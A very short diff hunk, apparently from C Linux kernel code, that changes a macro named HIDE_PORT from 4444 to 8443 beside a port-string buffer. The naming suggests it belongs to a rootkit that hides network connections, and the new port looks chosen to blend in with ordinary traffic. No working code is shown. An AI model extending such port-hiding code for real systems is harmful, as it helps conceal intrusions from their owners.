@@ -3,7 +3,7 @@
 
 #include <linux/file.h>
 
-#define HIDE_PORT 4444
+#define HIDE_PORT 8443
 
 static char portstr[8];
 
